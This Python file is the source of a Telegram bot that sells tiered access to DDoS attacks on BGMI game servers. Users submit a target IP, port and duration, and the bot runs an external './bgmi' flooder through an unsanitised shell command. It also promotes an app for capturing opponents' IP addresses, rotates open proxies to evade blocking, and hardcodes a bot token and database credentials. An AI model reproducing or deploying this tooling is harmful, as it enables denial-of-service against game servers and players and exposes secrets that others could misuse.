import subprocess
import sys

# List of packages to install
packages = [
    "telebot",
    "pyTelegramBotAPI",
    "requests",
    "psutil",
    "pymongo",
    "aiogram",
    "aiohttp",
    "pytz",
    "telethon",
    "timedelta",
    "python-telegram-bot",
]


# Function to install packages
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Install each package
for package in packages:
    try:
        print(f"Installing {package}...")
        install(package)
        print(f"{package} installed successfully.\n")
    except subprocess.CalledProcessError:
        print(f"Failed to install {package}.\n")
        
import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from subprocess import Popen
from threading import Thread
import asyncio
import aiohttp
from keepalive import keep_alive
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()


# Keep-Alive Function
def keep_alive():
    print("Keeping Codespace alive by performing periodic activity...")
    try:
        response = requests.get("https://www.google.com")
        if response.status_code == 200:
            print("Ping successful. Codespace is still active.")
        else:
            print(f"Ping failed with status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred during ping: {e}")

# Keep-Alive Thread
def start_keep_alive_thread():
    while True:
        keep_alive()
        time.sleep(300)  # Sleep for 5 minutes (300 seconds) before the next ping

# Start keep-alive in a separate thread
Thread(target=start_keep_alive_thread, daemon=True).start()

TOKEN = '7970419786:AAFmXQB1ddwKXsiyjnZ_akdZGASBuVYJmNY'
MONGO_URI = 'mongodb+srv://VIKASH:BadnamBadshah@cluster0.jv9he.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsAllowInvalidCertificates=true'
FORWARD_CHANNEL_ID = -1002226609740
CHANNEL_ID = -1002226609740
error_channel_id = -1002226609740

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['VIKASH']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

def update_proxy():
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration}")
    await process.communicate()

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1:  # Instant Plan 🧡
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
                return
        elif plan == 2:  # Instant++ Plan 💥
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "You are not approved to use this bot. Please contact the administrator.")
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "Your Instant Plan 🧡 is currently not available due to limit reached.")
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "Your Instant++ Plan 💥 is currently not available due to limit reached.")
            return

        bot.send_message(chat_id, "Enter the target IP, port, and duration (in seconds) separated by spaces.")
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*You are not approved to use this bot. Please contact the administrator.*", parse_mode='Markdown')
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "*Your Instant Plan 🧡 is currently not available due to limit reached.*", parse_mode='Markdown')
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "*Your Instant++ Plan 💥 is currently not available due to limit reached.*", parse_mode='Markdown')
            return

        bot.send_message(chat_id, "𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 ✅:\n*<𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*गलत हुआ है ट्राई अगेन 😼*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱🔥\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}\n𝗣𝗼𝗿𝘁: {target_port}\n𝗧𝗶𝗺𝗲: {duration} 𝐒𝐞𝐜.\n᚛ @Bgmi_owner_420 ᚜*", parse_mode='Markdown')
        
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop()) 
        
@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Create a markup object
    markup = ReplyKeyboardMarkup(row_width=3, resize_keyboard=True, one_time_keyboard=True)

    # Create buttons
    btn1 = KeyboardButton("𝐀𝐭𝐭𝐚𝐜𝐤")
    btn2 = KeyboardButton("𝐂𝐚𝐧𝐚𝐫𝐲 📟")
    btn3 = KeyboardButton("𝐆𝐄𝐓 𝐈𝐃")
    btn4 = KeyboardButton("𝓡𝓾𝓵𝓮𝓼")
    btn5 = KeyboardButton("𝐎𝐰𝐧𝐞𝐫🌟")
    btn6 = KeyboardButton("𝐌𝐲 𝐀𝐜𝐜𝐨𝐮𝐧𝐭🏦")

    # Add buttons to the markup
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6,)

    bot.send_message(message.chat.id, '*🌍 WELCOME TO DDOS WORLD!*' , reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "𝐀𝐭𝐭𝐚𝐜𝐤":
        #bot.reply_to(message, "*𝐔𝐬𝐞 𝐋𝐞𝐬𝐬 𝐓𝐡𝐚𝐧 𝟑𝟎𝟎 𝐒𝐞𝐜𝐨𝐧𝐝*", parse_mode='Markdown')
        attack_command(message)
        
        
    elif message.text == "𝐎𝐰𝐧𝐞𝐫🌟":
        bot.reply_to(message, "*https://t.me/Bgmi_owner_420*", parse_mode='Markdown')
        
    elif message.text == "𝐂𝐚𝐧𝐚𝐫𝐲 📟":
        canary_command(message)
        
    elif message.text == "𝓡𝓾𝓵𝓮𝓼":
        rules_command(message)
        
    elif message.text == "𝐌𝐲 𝐀𝐜𝐜𝐨𝐮𝐧𝐭🏦":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data:
            username = message.from_user.username
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')
            current_time = datetime.now().isoformat()
            response = (f"*USERNAME: {username}\n"
                        f"Plan: {plan}\n"
                        f"Current Time: {current_time}*")
        else:
            response = "*No account information found. Please contact the administrator.*"
        bot.reply_to(message, response, parse_mode='Markdown')
  
  #  elif message.text == "𝐂𝐚𝐧𝐚𝐫𝐲 💫":
       # bot.reply_to(message, "*CANARY LINK🔗: https://t.me/DARKCHEATSBGMI/88*", parse_mode='Markdown')
  #  elif message.text == "𝐎𝐰𝐧𝐞𝐫🌟":
       # bot.reply_to(message, "*https://t.me/Bgmi_owner_420*", parse_mode='Markdown')
        
    elif message.text == "𝐆𝐄𝐓 𝐈𝐃":
        user_id = message.from_user.id
        response = (f"`/approve {user_id} 99 9`")  # Monospace format
        bot.reply_to(message, response, parse_mode='Markdown')
        
   # else:
     #   bot.reply_to(message, "*𝙄𝙉𝙑𝘼𝙇𝙄𝘿 𝙊𝙋𝙏𝙄𝙊𝙉*", parse_mode='Markdown')
        
        
        
@bot.message_handler(commands=['rules'])
def rules_command(message):
    rules_text = (
        "*📜 Bot Rules - Keep It Cool!\n\n"
        "1. No spamming attacks! ⛔ \nRest for 5-6 matches between DDOS.\n\n"
        "2. Limit your kills! 🔫 \nStay under 30-40 kills to keep it fair.\n\n"
        "3. Play smart! 🎮 \nAvoid reports and stay low-key.\n\n"
        "4. No mods allowed! 🚫 \nUsing hacked files will get you banned.\n\n"
        "5. Be respectful! 🤝 \nKeep communication friendly and fun.\n\n"
        "6. Report issues! 🛡️ \nMessage TO Owner for any problems.\n\n"
        "💡 Follow the rules and let’s enjoy gaming together!*"
    )

    try:
        bot.send_message(message.chat.id, rules_text, reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    except Exception as e:
        print(f"Error while processing /rules command: {e}")

    except Exception as e:
        print(f"Error while processing /rules command: {e}")
        
@bot.message_handler(commands=['canary'])
def canary_command(message):
    response = ("*📥 Download the HttpCanary APK Now! 📥*\n\n"
                "*🔍 Track IP addresses with ease and stay ahead of the game! 🔍*\n"
                "*💡 Utilize this powerful tool wisely to gain insights and manage your network effectively. 💡*\n\n"
                "*Choose your platform:*")

    markup = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(
        text="📱 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗙𝗼𝗿 𝗔𝗻𝗱𝗿𝗼𝗶𝗱 📱",
        url="https://t.me/c/2035091831/88")
    button2 = types.InlineKeyboardButton(
        text="🍎 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗳𝗼𝗿 𝗶𝗢𝗦 🍎",
        url="https://apps.apple.com/in/app/surge-5/id1442620678")

    markup.add(button1)
    markup.add(button2)

    try:
        bot.send_message(message.chat.id,
                         response,
                         parse_mode='Markdown',
                         reply_markup=markup)
    except Exception as e:
        logging.error(f"Error while processing /canary command: {e}")

if __name__ == "__main__":
    
    keep_alive()
    
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
